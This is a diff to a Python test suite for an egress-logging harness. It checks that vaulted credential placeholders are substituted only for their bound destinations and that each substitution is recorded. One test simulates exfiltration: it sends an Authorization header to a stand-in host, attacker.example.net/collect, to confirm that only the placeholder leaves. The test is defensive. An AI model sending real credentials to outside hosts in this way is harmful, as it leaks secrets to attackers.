@@ -79,7 +79,8 @@ def rows(db) -> list[sqlite3.Row]:
     try:
         return list(conn.execute(
             "SELECT tool, destination, host, decision, session_id, worker_source,"
-            " task_id, scope, reason, at FROM egress_events ORDER BY id"))
+            " task_id, scope, reason, at, credentials FROM egress_events"
+            " ORDER BY id"))
     except sqlite3.OperationalError:
         return []
 
@@ -98,6 +99,15 @@ def test_http_fetch_records_one_row_with_the_destination(socket, db):
 
 
 def test_http_request_records_its_own_row(socket, db):
+    # Identity only — which tool, which destination, which host. It says nothing about
+    # substitution and cannot: the call carries no header, so no swap could run at this
+    # host, and asserting "the column stayed empty" here would be measuring a mechanism
+    # that never had an input. Both directions that DO have one are pinned in the #3846
+    # section, each asserting the binding on the destination its own row carries:
+    # `test_a_substitution_writes_one_row_naming_credential_destination_decision` (bound
+    # -> real value on the wire, record written) and
+    # `test_an_unbound_destination_keeps_the_placeholder_and_still_writes` (unbound -> the
+    # placeholder leaves unchanged, `out-of-binding` recorded).
     http_tools._http_request("POST", "http://api.internal-lab.test:8080/ingest",
                              body='{"k":1}')
 
@@ -359,3 +369,168 @@ def test_permanent_allow_entries_are_counted_rather_than_hidden(db):
                         + dt.timedelta(days=30)).isoformat()},
     ]
     assert egress.count_permanent_entries(monkeypatch_allow) == 1
+
+
+# ── #3846: the credential substitution rides on the same row ────────────────
+
+class HeaderStubClient(StubClient):
+    """A stub that records the headers actually handed to the transport.
+
+    The question these nodes ask is what went OUT, not what the caller built, so a
+    stub that ignores `kwargs` — the one above, which is right for its own nodes —
+    could not answer it.
+    """
+
+    def __init__(self, *a, **k):
+        super().__init__(*a, **k)
+        self.header_calls: list[dict] = []
+
+    def request(self, method, url, **kwargs):
+        self.header_calls.append(dict(kwargs.get("headers") or {}))
+        return super().request(method, url, **kwargs)
+
+
+@pytest.fixture
+def headers_socket(monkeypatch):
+    client = HeaderStubClient()
+    monkeypatch.setattr(http_tools, "make_sync_http_client", client)
+    return client
+
+
+CRED = "LIVEKIT_API_SECRET"
+
+
+@pytest.fixture
+def registry(tmp_path, monkeypatch):
+    """A vault registry binding one credential to one destination.
+
+    The credential NAME is a real vaulted one so `name_of_placeholder` recognises
+    its placeholder, and the VALUE is a fixture string rather than a real secret:
+    these nodes are about which bytes the gate sends, and nothing here needs the
+    box's actual tokens.
+    """
+    import json
+    from app.harness import credential_store as cs
+    path = tmp_path / "credentials.json"
+    path.write_text(json.dumps({"credentials": {
+        CRED: {"destinations": ["https://bound.example.org"]}}}),
+        encoding="utf-8")
+    monkeypatch.setattr(cs, "store_path", lambda: path)
+    monkeypatch.setattr(cs, "real_value",
+                        lambda name: "REAL-FIXTURE-VALUE" if name
+                        == CRED else None)
+    return path
+
+
+def test_a_substitution_writes_one_row_naming_credential_destination_decision(
+        headers_socket, registry, db):
+    """Clause 5: the swap and the destination land on ONE row.
+
+    The item's reason for putting substitution on this table rather than a new one
+    is that the question an auditor asks is whether the credential and the
+    destination ever disagreed — which needs them in the same record.
+    """
+    from app.harness import credential_store as cs
+    ph = cs.placeholder_for(CRED)
+    http_tools._http_request("GET", "https://bound.example.org/v1/me",
+                             headers={"Authorization": "Bearer " + ph})
+
+    (row,) = rows(db)
+    assert row["destination"] == "https://bound.example.org"
+    # The binding is asserted on the destination THIS row carries, read back from the
+    # registry: on a host no credential names, an `:applied` record would be true whether
+    # or not the substitution path worked at all, and the node would be reporting its own
+    # transport stub rather than the gate.
+    assert cs.bound_for(CRED, row["destination"]), (
+        "the fixture registry must bind this row's destination, or the pairing below is "
+        "a coincidence rather than a mechanism")
+    assert row["credentials"] == CRED + ":applied", (
+        "the row does not name the credential and what the gate did with it")
+    assert headers_socket.header_calls[-1]["Authorization"] == \
+        "Bearer REAL-FIXTURE-VALUE", "the swap did not reach the transport"
+
+
+def test_an_unbound_destination_keeps_the_placeholder_and_still_writes(
+        headers_socket, registry, db):
+    """The exfiltration case, measured: the placeholder is what leaves.
+
+    A reader who pastes the same header at a host the credential is NOT bound to
+    gets the dummy on the wire and a row that says `out-of-binding` — so the table
+    can answer "was this credential ever spent somewhere it should not have been?"
+    without the harness having refused anything (`enforce` is still off, #628's
+    flip remains a human call).
+    """
+    from app.harness import credential_store as cs
+    ph = cs.placeholder_for(CRED)
+    http_tools._http_request("GET", "https://attacker.example.net/collect",
+                             headers={"Authorization": "Bearer " + ph})
+
+    from app.harness import credential_store as cs
+
+    (row,) = rows(db)
+    assert row["destination"] == "https://attacker.example.net"
+    assert CRED + ":out-of-binding" == row["credentials"]
+    assert headers_socket.header_calls[-1]["Authorization"] == "Bearer " + ph, (
+        "a credential was substituted for an unbound destination — the binding is "
+        "the whole control")
+    assert "REAL-FIXTURE-VALUE" not in json.dumps(headers_socket.header_calls)
+
+
+def test_a_call_with_no_placeholder_writes_an_empty_credentials_column(
+        headers_socket, db):
+    """The column stays empty rather than absent or NULL for every ordinary call.
+
+    `enforce` is off and telemetry is unconditional, so this column is on the
+    commonest row in the table; a NULL would make `WHERE credentials <> ''` miss
+    rows in some readers and a default of `none` would make the "at least one real
+    substitution row" acceptance check unreadable as a plain count.
+    """
+    http_tools._http_request("GET", "https://example.org/")
+    (row,) = rows(db)
+    assert row["credentials"] == ""
+
+
+def test_an_existing_store_without_the_column_migrates_before_the_first_insert(
+        tmp_path, monkeypatch):
+    """The migration is not decoration: the live store already has rows.
+
+    `CREATE TABLE IF NOT EXISTS` is a no-op on an existing table, so a build that
+    only edited the schema string would have its INSERT fail on every guarded call
+    and drop EVERY telemetry row through `_record`'s fail-open branch — while the
+    tools kept working and the table quietly stopped growing. This node recreates
+    the pre-#3844 table shape, runs one guarded call, and demands the row.
+    """
+    db = tmp_path / "legacy.db"
+    monkeypatch.setenv("LLOYD_EGRESS_DB", str(db))
+    monkeypatch.setattr(egress, "config",
+                        lambda: {"telemetry": True, "enforce": False, "allow": [],
+                                 "retention_days": 90})
+    # A fresh process-level init cache for this file, so `_ensure` really runs
+    # against a table that predates the column. Restored by monkeypatch.
+    monkeypatch.setattr(egress, "_init_done", set())
+    conn = sqlite3.connect(str(db))
+    conn.executescript("""
+        CREATE TABLE egress_events (
+          id INTEGER PRIMARY KEY AUTOINCREMENT, at TEXT NOT NULL,
+          tool TEXT NOT NULL, destination TEXT NOT NULL, host TEXT NOT NULL,
+          decision TEXT NOT NULL, scope TEXT NOT NULL DEFAULT '',
+          session_id TEXT NOT NULL DEFAULT '', worker_source TEXT NOT NULL DEFAULT '',
+          task_id TEXT NOT NULL DEFAULT '', reason TEXT NOT NULL DEFAULT '');
+        INSERT INTO egress_events (at, tool, destination, host, decision)
+          VALUES ('2026-01-01T00:00:00+00:00','http_fetch','https://old.example','old.example','allow');
+    """)
+    conn.commit()
+    conn.close()
+
+    egress.guard("http_fetch", "https://migrate.example/x")
+
+    conn = sqlite3.connect(str(db))
+    conn.row_factory = sqlite3.Row
+    try:
+        live = list(conn.execute(
+            "SELECT credentials, destination FROM egress_events ORDER BY id"))
+    finally:
+        conn.close()
+    assert len(live) == 2, "the new row was lost — the fail-open branch swallowed it"
+    assert live[0]["credentials"] == "", "the pre-existing row must not be rewritten"
+    assert live[1]["destination"] == "https://migrate.example"
